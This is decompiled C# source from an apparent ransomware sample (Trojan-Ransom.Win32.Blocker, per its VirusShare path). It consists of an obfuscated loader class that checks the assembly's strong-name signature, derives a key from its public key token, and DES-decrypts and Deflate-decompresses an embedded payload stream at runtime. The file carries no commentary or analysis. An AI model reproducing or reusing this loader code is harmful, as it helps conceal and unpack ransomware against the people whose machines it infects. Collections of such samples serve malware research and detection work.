// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Loader.installer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=5afe7557eabdd922
// MVID: 60E69C82-3262-4EB0-AE17-CA746ABA1DFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.mfa-066a8b95598361161e98b8e646e296c6d99174a08f1217945906b9bb95c02611.exe

using \u0005;
using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;

namespace \u0005
{
  internal sealed class \u0001
  {
    private static MemoryStream \u0001;
    private static MemoryStream \u0002;
    private static object \u0001;
    private static int \u0001;
    private static int \u0002;

    static \u0001()
    {
      bool flag = false;
      Assembly assembly = \u0001.\u0001();
      if (true)
      {
        if (\u0001.\u0001(\u0014.\u007E\u001C((object) assembly), true, out flag))
          goto label_14;
label_8:
        throw new SecurityException(\u0005.\u0005.\u0001(262));
label_14:
        int num1 = flag ? 1 : 0;
        if (true)
        {
          if (num1 != 0)
          {
            int num2 = \u0015.\u007E\u001E((object) \u0014.\u007E\u001B((object) assembly), \u0005.\u0005.\u0001(237)) ? 1 : 0;
            if (true)
            {
              if (true)
              {
                if (num2 != 0)
                  num1 = int.MaxValue;
                else
                  goto label_8;
              }
              else
                num1 = num2;
            }
            else
            {
              num1 = num2;
              goto label_12;
            }
          }
          else
            goto label_8;
        }
        if (num1 != 0)
        {
          \u0001.\u0001 = num1;
          num1 = int.MinValue;
        }
label_12:
        \u0001.\u0002 = num1;
        \u0001.\u0001 = (MemoryStream) null;
      }
      \u0001.\u0002 = (MemoryStream) null;
      \u0001.\u0001 = new object();
    }

    private static byte[] \u0001([In] Assembly obj0)
    {
      byte[] numArray1;
      try
      {
        string str1 = \u0014.\u007E\u001B((object) obj0);
        int num1 = \u007F.\u007E\u008A((object) str1, \u0005.\u0005.\u0001(299));
        if (num1 < 0)
          num1 = \u007F.\u007E\u008A((object) str1, \u0005.\u0005.\u0001(320));
        if (num1 < 0)
        {
          if (true)
          {
            numArray1 = (byte[]) null;
            goto label_20;
          }
        }
        else
        {
          int num2 = num1;
          int num3 = 15;
          if (num3 != 0)
          {
            num1 = num2 + num3;
            int num4 = (int) \u0080.\u007E\u008B((object) str1, num1);
            if (true)
            {
              if (num4 != 110)
              {
label_8:
                switch (3)
                {
                  case 0:
                    goto label_8;
                  default:
                    num4 = 1;
                    break;
                }
              }
              else
                goto label_15;
            }
            if (num4 == 0)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.\u0001);
            }
            num2 = num3 = (int) \u0080.\u007E\u008B((object) str1, num1);
          }
          if (num2 != 78)
          {
            string str2 = \u0018.\u007E\u0080((object) str1, num1, 16);
            long num5 = \u0081.\u008C(str2, NumberStyles.HexNumber);
            byte[] numArray2 = \u0082.\u008D(num5);
            \u0083.\u008E((Array) numArray2);
            do
            {
              numArray1 = numArray2;
            }
            while (false);
            goto label_20;
          }
        }
label_14:
        switch (2)
        {
          case 0:
            goto label_14;
        }
label_15:
        do
        {
          numArray1 = (byte[]) null;
        }
        while (false);
        goto label_20;
      }
      catch
      {
      }
label_19:
      return (byte[]) null;
label_20:
      if (true)
        return numArray1;
      goto label_19;
    }

    internal static unsafe byte[] \u0001([In] Stream obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(14);
      object obj;
      \u0084.\u008F(obj = \u0001.\u0001);
      try
      {
        Stream stream = obj0;
        MemoryStream memoryStream = (MemoryStream) null;
        byte num1 = (byte) \u0086.\u007E\u0091((object) obj0);
        if (((int) num1 & 2) != 0)
        {
          DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
          byte[] numArray1 = new byte[8];
          int num2 = \u0004.\u007E\u0005((object) obj0, numArray1, 0, 8);
          \u0087.\u007E\u0094((object) cryptoServiceProvider, numArray1);
          byte[] numArray2 = new byte[8];
          int num3 = \u0004.\u007E\u0005((object) obj0, numArray2, 0, 8);
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
          byte[] numArray3 = numArray2;
          *(int*) ((IntPtr) voidPtr + 8) = 0;
          while (true)
          {
            if (*(int*) ((IntPtr) voidPtr + 8) >= numArray3.Length)
              goto label_7;
label_3:
            *(sbyte*) ((IntPtr) voidPtr + 13) = (sbyte) numArray3[*(int*) ((IntPtr) voidPtr + 8)];
            if (*(byte*) ((IntPtr) voidPtr + 13) != (byte) 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              continue;
            }
label_7:
            if (*(sbyte*) ((IntPtr) voidPtr + 12) != (sbyte) 0)
              numArray2 = \u0001.\u0001(\u0001.\u0001());
            \u0087.\u007E\u0095((object) cryptoServiceProvider, numArray2);
            if (\u0001.\u0001 == null)
            {
label_10:
              switch (7)
              {
                case 0:
                  goto label_10;
                default:
                  if (false)
                  {
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.\u0001);
                  }
                  if (\u0001.\u0001 != int.MaxValue)
                  {
                    if (false)
                      goto label_3;
                    else
                      goto label_17;
                  }
                  else
                    goto label_14;
              }
            }
            else
              goto label_18;
          }
label_14:
          switch (5)
          {
            case 0:
              goto label_14;
            default:
              \u0001.\u0001 = new MemoryStream((int) \u0003.\u007E\u0003((object) obj0));
              goto label_18;
          }
label_17:
          \u0001.\u0001 = new MemoryStream(\u0001.\u0001);
label_18:
          \u0088.\u007E\u0096((object) \u0001.\u0001, 0L);
          ICryptoTransform cryptoTransform = \u0089.\u007E\u0097((object) cryptoServiceProvider);
          *(int*) voidPtr = \u0086.\u007E\u0092((object) cryptoTransform);
          int num4 = \u0086.\u007E\u0093((object) cryptoTransform);
          byte[] numArray4 = new byte[\u0086.\u007E\u0093((object) cryptoTransform)];
          byte[] numArray5 = new byte[\u0086.\u007E\u0092((object) cryptoTransform)];
          int num5;
          for (num5 = (int) \u0003.\u007E\u0004((object) obj0); (long) (num5 + *(int*) voidPtr) < \u0003.\u007E\u0003((object) obj0); num5 += *(int*) voidPtr)
          {
            int num6 = \u0004.\u007E\u0005((object) obj0, numArray5, 0, *(int*) voidPtr);
            int num7 = \u008A.\u007E\u0098((object) cryptoTransform, numArray5, 0, *(int*) voidPtr, numArray4, 0);
            \u0008.\u007E\u0012((object) \u0001.\u0001, numArray4, 0, num7);
          }
          int num8 = \u0004.\u007E\u0005((object) obj0, numArray5, 0, (int) (\u0003.\u007E\u0003((object) obj0) - (long) num5));
          byte[] numArray6 = \u008B.\u007E\u0099((object) cryptoTransform, numArray5, 0, (int) (\u0003.\u007E\u0003((object) obj0) - (long) num5));
          \u0008.\u007E\u0012((object) \u0001.\u0001, numArray6, 0, numArray6.Length);
          stream = (Stream) \u0001.\u0001;
          \u0088.\u007E\u0096((object) stream, 0L);
          memoryStream = \u0001.\u0001;
        }
        if (((int) num1 & 8) != 0)
        {
label_23:
          switch (4)
          {
            case 0:
              goto label_23;
            default:
              try
              {
                if (\u0001.\u0002 == null)
                {
label_25:
                  switch (5)
                  {
                    case 0:
                      goto label_25;
                    default:
                      if (\u0001.\u0002 == int.MinValue)
                      {
label_27:
                        switch (7)
                        {
                          case 0:
                            goto label_27;
                          default:
                            \u0001.\u0002 = new MemoryStream((int) \u0003.\u007E\u0003((object) stream) * 2);
                            break;
                        }
                      }
                      else
                      {
                        \u0001.\u0002 = new MemoryStream(\u0001.\u0002);
                        break;
                      }
                      break;
                  }
                }
                \u0088.\u007E\u0096((object) \u0001.\u0002, 0L);
                DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
                *(int*) ((IntPtr) voidPtr + 4) = 1000;
                byte[] numArray = new byte[*(int*) ((IntPtr) voidPtr + 4)];
                int num9;
                do
                {
                  num9 = \u0004.\u007E\u0005((object) deflateStream, numArray, 0, *(int*) ((IntPtr) voidPtr + 4));
                  if (num9 > 0)
                    \u0008.\u007E\u0012((object) \u0001.\u0002, numArray, 0, num9);
                }
                while (num9 >= *(int*) ((IntPtr) voidPtr + 4));
label_34:
                switch (6)
                {
                  case 0:
                    goto label_34;
                  default:
                    memoryStream = \u0001.\u0002;
                    break;
                }
              }
              catch (Exception ex)
              {
                break;
              }
              break;
          }
        }
        if (memoryStream != null)
        {
label_38:
          switch (4)
          {
            case 0:
              goto label_38;
            default:
              return \u008C.\u007E\u009A((object) memoryStream);
          }
        }
        else
        {
          byte[] numArray = new byte[\u0003.\u007E\u0003((object) obj0) - \u0003.\u007E\u0004((object) obj0)];
          int num10 = \u0004.\u007E\u0005((object) obj0, numArray, 0, numArray.Length);
          return numArray;
        }
      }
      finally
      {
        \u0084.\u0090(obj);
      }
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
